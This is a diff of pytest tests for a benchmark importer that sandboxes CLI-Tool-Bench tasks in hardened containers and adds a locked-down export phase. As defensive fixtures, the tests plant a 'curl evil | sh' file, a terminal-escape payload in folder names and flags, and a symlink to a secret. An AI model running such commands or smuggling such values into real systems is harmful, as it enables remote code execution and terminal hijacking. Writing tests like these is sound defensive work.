@@ -444,7 +444,7 @@ def test_recorded_file_content_must_hash_to_its_sha256_and_stays_out_of_the_hidd
 def test_the_recorded_outputs_replayed_pass_every_case_the_playback_can_identify(
     task: BenchTask, tmp_path: Path
 ) -> None:
-    report = replay_check(task, frozen(tmp_path / "src"))
+    report = replay_check(task, loaded(frozen(tmp_path / "src")))
     # c0006 passes its name through "$(cat ...)": the playback cannot know its arguments.
     assert report.unverified == ("c0006",)
     assert set(report.verified) == {c["id"] for c in CASES} - {"c0006"}
@@ -456,7 +456,7 @@ def test_a_replay_slower_than_half_the_suite_cap_drops_the_task(
     task: BenchTask, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
     monkeypatch.setattr(imported, "REPLAY_MAX_S", 0.0)
-    problem = replay_check(task, frozen(tmp_path / "src")).problem
+    problem = replay_check(task, loaded(frozen(tmp_path / "src"))).problem
     assert problem is not None and "the replay took" in problem
 
 
@@ -470,7 +470,7 @@ TWINS = [
 def test_recorded_outputs_no_product_can_reach_drop_the_task(tmp_path: Path) -> None:
     src = frozen(tmp_path / "src", TWINS)
     task = load_task(convert_clitoolbench(src, tmp_path / "t"))
-    report = replay_check(task, src)
+    report = replay_check(task, loaded(src))
     assert report.failed == ("c0001", "c0002")  # ambiguous: the playback answers neither
     assert report.problem is not None and "no product can pass" in report.problem
 
@@ -712,14 +712,20 @@ DIGEST = "sha256:" + "ab" * 32
 
 
 def run_freeze(tmp_path: Path, name: str, *args: str) -> Path:
-    """Both phases, as the two containers run them: install, then run on the same work folder."""
-    bench, out = tmp_path / "bench", tmp_path / name
+    """The three phases as the three containers run them: install and run on one work folder
+    (the volume), then export of the run's output into an empty out folder."""
+    bench, out, work = tmp_path / "bench", tmp_path / name, tmp_path / f"work-{name}"
     env = {**os.environ, "CLITOOLBENCH_IN_CONTAINER": "1"}
-    common = [str(bench), "--work", str(tmp_path / f"work-{name}"), "--venv-without-pip", *args]
-    for phase in (["--phase", "install"], ["--phase", "run", "--out", str(out)]):
+    common = [str(bench), "--work", str(work), "--venv-without-pip", *args]
+    for phase in (["--phase", "install"], ["--phase", "run", "--out", str(work / "out")]):
         argv = [sys.executable, "-I", str(FREEZE), *phase, "--image-digest", DIGEST, *common]
         done = subprocess.run(argv, env=env, capture_output=True, text=True, check=False)
         assert done.returncode == 0, done.stderr
+    out.mkdir()
+    argv = [sys.executable, "-I", str(FREEZE), "--phase", "export"]
+    argv += ["--from", str(work / "out"), "--out", str(out)]
+    done = subprocess.run(argv, env=env, capture_output=True, text=True, check=False)
+    assert done.returncode == 0, done.stderr
     return out
 
 
@@ -855,7 +861,7 @@ def test_grading_refuses_without_a_sandbox_and_runs_nothing(
     with pytest.raises(GateError, match="sandbox"):
         validate_task(task)
     with pytest.raises(GateError, match="sandbox"):
-        replay_check(task, frozen(tmp_path / "src"))
+        replay_check(task, loaded(frozen(tmp_path / "src")))
     assert no_sandbox == []
 
 
@@ -877,7 +883,7 @@ def test_off_in_the_environment_does_not_turn_the_sandbox_off_for_imported_tasks
     task: BenchTask, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
     monkeypatch.setenv("BOSS_GATE_SANDBOX", "off")
-    report = replay_check(task, frozen(tmp_path / "src"))
+    report = replay_check(task, loaded(frozen(tmp_path / "src")))
     assert report.sandboxed and report.problem is None
 
 
@@ -1065,7 +1071,7 @@ def run_sh(
     )
 
 
-def test_the_runner_hardens_both_containers_and_cuts_the_network_for_the_run_phase(
+def test_the_runner_hardens_all_three_containers_and_cuts_the_network_after_install(
     tmp_path: Path,
 ) -> None:
     bench = tmp_path / "bench"
@@ -1078,8 +1084,9 @@ def test_the_runner_hardens_both_containers_and_cuts_the_network_for_the_run_pha
     assert f"--build-arg BASE_DIGEST={DIGEST}" in build
     install = next(line for line in lines if "--phase install" in line).split()
     run = next(line for line in lines if "--phase run" in line).split()
+    exported = next(line for line in lines if "--phase export" in line).split()
     uid_gid = f"{os.getuid()}:{os.getgid()}"
-    for argv in (install, run):
+    for argv in (install, run, exported):
         flags = " ".join(argv)
         for flag in (
             f"--user {uid_gid}",
@@ -1089,17 +1096,28 @@ def test_the_runner_hardens_both_containers_and_cuts_the_network_for_the_run_pha
             "--memory 4g",
             "--cpus 2",
             "--stop-timeout 10",
-            f"-v {bench.resolve()}:/bench:ro",
-            f"--image-digest {DIGEST}",
+            "--add-host host.docker.internal:127.0.0.1",
+            "--add-host gateway.docker.internal:127.0.0.1",
             "--rm",
         ):
             assert flag in flags, flag
         assert "--chown" not in flags
-        volume = next(a for a in argv if a.endswith(":/clitb-work"))
+        volume = next(a for a in argv if ":/clitb-work" in a)
         assert volume.startswith("antstreet-clitb-work-")
+    for argv in (install, run):
+        assert f"-v {bench.resolve()}:/bench:ro" in " ".join(argv)
+        assert f"--image-digest {DIGEST}" in " ".join(argv)
+        assert next(a for a in argv if ":/clitb-work" in a).endswith(":/clitb-work")
     assert "--network none" in " ".join(run) and "--network" not in install
-    assert not any(a.endswith(":/out") for a in install)
-    assert f"{(tmp_path / 'o').resolve()}:/out" in " ".join(run)
+    assert "--network none" in " ".join(exported)
+    # Only export, which runs no third-party code, sees the owner's disk; it reads the volume
+    # read-only and is not given the checkout.
+    assert not any(a.endswith(":/out") for a in install + run)
+    assert f"{(tmp_path / 'o').resolve()}:/out" in " ".join(exported)
+    assert next(a for a in exported if ":/clitb-work" in a).endswith(":/clitb-work:ro")
+    assert "/bench" not in " ".join(exported)
+    assert "--out /clitb-work/out" in " ".join(run)
+    assert ":4173" in done.stderr and ":8765" in done.stderr and ":4310" in done.stderr
 
 
 @pytest.mark.parametrize(
@@ -1121,20 +1139,30 @@ def test_the_runner_refuses_an_unsafe_or_used_out_dir(tmp_path: Path) -> None:
     bench.mkdir()
     home = tmp_path / "home"
     (home / ".ssh").mkdir(parents=True)
+    (home / "work" / ".cache").mkdir(parents=True)
+    (home / "Library").mkdir()
     used = tmp_path / "used"
     used.mkdir()
     (used / "x").write_text("x")
+    # A symlink that looks harmless but lands in the repository, and one into a dot folder.
+    (tmp_path / "innocent").symlink_to(ROOT / "bench", target_is_directory=True)
+    (tmp_path / "plain").symlink_to(home / "work" / ".cache", target_is_directory=True)
     for out, message in (
         (used, "is not empty"),
         (ROOT / "frozen-here", "inside the repository"),
+        (tmp_path / "innocent" / "frozen", "inside the repository"),
         (home / ".ssh" / "frozen", "dot folder"),
+        (home / "work" / ".cache" / "frozen", "dot folder"),
+        (tmp_path / "plain" / "frozen", "dot folder"),
+        (home / "Library" / "frozen", "~/Library"),
     ):
         done = run_sh(
             tmp_path, "--dry-run", "--image-digest", DIGEST, str(bench), str(out), home=home
         )
         assert done.returncode == 2 and message in done.stderr, (out, done.stderr)
         assert "docker" not in done.stdout
-    assert not (ROOT / "frozen-here").exists() and not (tmp_path / "docker-called").exists()
+    assert not (ROOT / "frozen-here").exists() and not (ROOT / "bench" / "frozen").exists()
+    assert not (tmp_path / "docker-called").exists()
 
 
 def test_the_image_is_pinned_by_digest_and_runs_unprivileged() -> None:
@@ -1333,3 +1361,207 @@ def test_convert_all_never_overwrites_a_task_already_in_the_pool(tmp_path: Path)
     reasons = {r["task"]: r["reason"] for r in manifest["dropped"]}
     assert "clitb-greet already exists" in reasons["acme/greet"]
     assert not list(pool.glob("staging-*"))
+
+
+# --- second review: hostile shapes never abort a run, never reach a terminal raw --------------
+
+
+def loaded(src: Path) -> dict[str, Any]:
+    return imported._load_frozen(src / "cases.json")
+
+
+def test_a_cases_json_that_is_a_folder_is_refused_not_a_crash(tmp_path: Path) -> None:
+    src = frozen(tmp_path / "a")
+    (src / "cases.json").unlink()
+    (src / "cases.json").mkdir()
+    with pytest.raises(ConvertError, match="not a regular file"):
+        convert_clitoolbench(src, tmp_path / "t")
+    with pytest.raises(ConvertError, match="not a regular file"):
+        imported._read_bounded(src / "cases.json", 100)
+
+
+def test_one_hostile_task_never_aborts_convert_all(tmp_path: Path) -> None:
+    out = freeze_output(tmp_path)
+    folder = frozen(out, task="acme/folder")
+    (folder / "cases.json").unlink()
+    (folder / "cases.json").mkdir()
+    pool = tmp_path / "pool"
+    manifest = imported.convert_clitoolbench_all(out, pool)
+    assert [k["id"] for k in manifest["kept"]] == ["clitb-greet"]
+    reasons = {r["task"]: r["reason"] for r in manifest["dropped"]}
+    assert "not a regular file" in reasons["acme__folder"]
+
+
+def test_a_task_read_error_is_a_drop_not_a_traceback(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    out = freeze_output(tmp_path)
+    real = imported.convert_clitoolbench_all.__globals__["_convert"]
+
+    def flaky_disk(src: Path, *args: Any, **kwargs: Any) -> Any:
+        if src.name == "acme__twins":
+            raise PermissionError(13, "Permission denied")
+        return real(src, *args, **kwargs)
+
+    monkeypatch.setattr(imported, "_convert", flaky_disk)
+    manifest = imported.convert_clitoolbench_all(out, tmp_path / "pool")
+    reasons = {r["task"]: r["reason"] for r in manifest["dropped"]}
+    assert "Permission denied" in reasons["acme__twins"]
+
+
+def test_an_aborted_run_leaves_no_task_half_moved_into_the_pool(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    out = freeze_output(tmp_path)
+    frozen(out, task="acme/zzz")  # converted after acme/greet, which already passed
+    real = imported.replay_check
+
+    def gate_breaks(task: BenchTask, data: dict[str, Any]) -> Any:
+        if data["task"] == "acme/zzz":
+            raise GateError("a sandbox is required but bwrap stopped working")
+        return real(task, data)
+
+    monkeypatch.setattr(imported, "replay_check", gate_breaks)
+    pool = tmp_path / "pool"
+    with pytest.raises(GateError):
+        imported.convert_clitoolbench_all(out, pool)
+    assert list(pool.iterdir()) == []  # neither clitb-greet nor any staging folder
+
+
+def test_cases_json_is_read_once_per_task(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    out = freeze_output(tmp_path)
+    reads: list[str] = []
+    real = imported._read_bounded
+
+    def counting(path: Path, limit: int) -> str:
+        reads.append(f"{path.parent.name}/{path.name}")
+        return real(path, limit)
+
+    monkeypatch.setattr(imported, "_read_bounded", counting)
+    imported.convert_clitoolbench_all(out, tmp_path / "pool")
+    assert reads.count("acme__greet/cases.json") == 1
+    assert reads.count("acme__twins/cases.json") == 1
+
+
+ESCAPE = "x\x1b]0;PWNED\x07y"
+
+
+def test_a_hostile_task_folder_name_reaches_neither_the_screen_nor_the_manifest_raw(
+    tmp_path: Path, capsys: Any
+) -> None:
+    out = freeze_output(tmp_path)
+    hostile = out / ESCAPE
+    hostile.mkdir()
+    (hostile / "cases.json").write_text("{}")
+    pool = tmp_path / "pool"
+    assert main(["clitoolbench", str(out), str(pool), "--all"]) == 0
+    printed = capsys.readouterr()
+    manifest_text = (pool / "clitoolbench-manifest.json").read_text()
+    for text in (printed.out, printed.err, json.loads(manifest_text)["dropped"][-1]["task"]):
+        assert "\x1b" not in text and "\x07" not in text
+    assert any(r["task"] == "x ]0;PWNED y" for r in json.loads(manifest_text)["dropped"])
+
+
+def test_flags_and_deps_with_control_characters_are_refused(tmp_path: Path) -> None:
+    with pytest.raises(ConvertError, match="flags"):
+        convert_clitoolbench(frozen(tmp_path / "a", flags=[ESCAPE]), tmp_path / "t")
+    with pytest.raises(ConvertError, match="oracle.deps"):
+        convert_clitoolbench(
+            frozen(tmp_path / "b", **header(oracle={"deps": [ESCAPE]})), tmp_path / "t"
+        )
+
+
+def test_printed_flags_and_deps_are_cleaned_too(tmp_path: Path, capsys: Any) -> None:
+    dest = tmp_path / "clitb-x"
+    dest.mkdir()
+    provenance = {"flags": [ESCAPE, "oracle_needs_third_party"], "oracle": {"deps": [ESCAPE]}}
+    (dest / "provenance.json").write_text(json.dumps(provenance))
+    imported._warn_flags(dest)
+    err = capsys.readouterr().err
+    assert "PWNED" in err and "\x1b" not in err and "\x07" not in err
+
+
+def test_method_names_the_untrusted_spec_and_the_local_services() -> None:
+    body = (ROOT / "bench" / "METHOD.md").read_text().split("## CLI-Tool-Bench (frozen)")[1]
+    body = body.split("\n## ")[0]
+    for term in (
+        "untrusted text",
+        "Read/Write/Edit",
+        "no shell",
+        "the gate, not the model",
+        ":4173",
+        ":8765",
+        ":4310",
+        "host.docker.internal",
+        "export",
+    ):
+        assert term in body, term
+
+
+# --- phase export: the only path from the volume to the owner's disk -------------------------
+
+
+def test_export_copies_only_the_allowed_regular_files_and_nothing_else(tmp_path: Path) -> None:
+    source, out = tmp_path / "volume-out", tmp_path / "out"
+    good = source / "acme__greet"
+    good.mkdir(parents=True)
+    out.mkdir()
+    (source / "index.json").write_text("{}")
+    (good / "cases.json").write_text("{}")
+    (good / "spec.md").write_text("# greet\n")
+    (good / "run.sh").write_text("curl evil | sh")  # not a name export knows
+    linked = source / "acme__linked"
+    linked.mkdir()
+    (linked / "cases.json").symlink_to(planted_secret(tmp_path))
+    os.mkfifo(linked / "spec.md")
+    (linked / "skipped.json").write_text("x" * (64 * 1024 + 1))  # over its limit
+    (source / "not a task").mkdir()
+    (source / "acme__file").write_text("not a folder")
+    env = {**os.environ, "CLITOOLBENCH_IN_CONTAINER": "1"}
+    argv = [sys.executable, "-I", str(FREEZE), "--phase", "export"]
+    argv += ["--from", str(source), "--out", str(out)]
+    done = subprocess.run(argv, env=env, capture_output=True, text=True, check=False)
+    assert done.returncode == 0, done.stderr
+    copied = sorted(p.relative_to(out).as_posix() for p in out.rglob("*") if p.is_file())
+    assert copied == ["acme__greet/cases.json", "acme__greet/spec.md", "index.json"]
+    assert all(not p.is_symlink() for p in out.rglob("*"))
+    assert SECRET not in "".join(p.read_text() for p in out.rglob("*") if p.is_file())
+    for refused in (
+        "acme__greet/run.sh",
+        "acme__linked/cases.json",
+        "acme__linked/spec.md",
+        "acme__linked/skipped.json",
+        "not a task",
+        "acme__file",
+    ):
+        assert f"not exported: {refused}" in done.stderr
+    again = subprocess.run(argv, env=env, capture_output=True, text=True, check=False)
+    assert again.returncode == 2 and "must be an existing empty folder" in again.stderr
+
+
+def test_a_read_that_fails_midway_is_a_refusal_not_a_traceback(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    class FailingHandle:
+        def __enter__(self) -> FailingHandle:
+            return self
+
+        def __exit__(self, *args: object) -> None:
+            return None
+
+        def read(self, size: int) -> bytes:
+            raise OSError(5, "Input/output error")
+
+    (tmp_path / "cases.json").write_text("{}")
+    real_fdopen = os.fdopen
+    opened: list[int] = []
+
+    def failing_fdopen(fd: int, *args: Any, **kwargs: Any) -> FailingHandle:
+        opened.append(fd)
+        real_fdopen(fd).close()  # the descriptor is still released
+        return FailingHandle()
+
+    monkeypatch.setattr(imported.os, "fdopen", failing_fdopen)
+    with pytest.raises(ConvertError, match="cannot read .*Input/output error"):
+        imported._read_bounded(tmp_path / "cases.json", 100)
+    assert opened
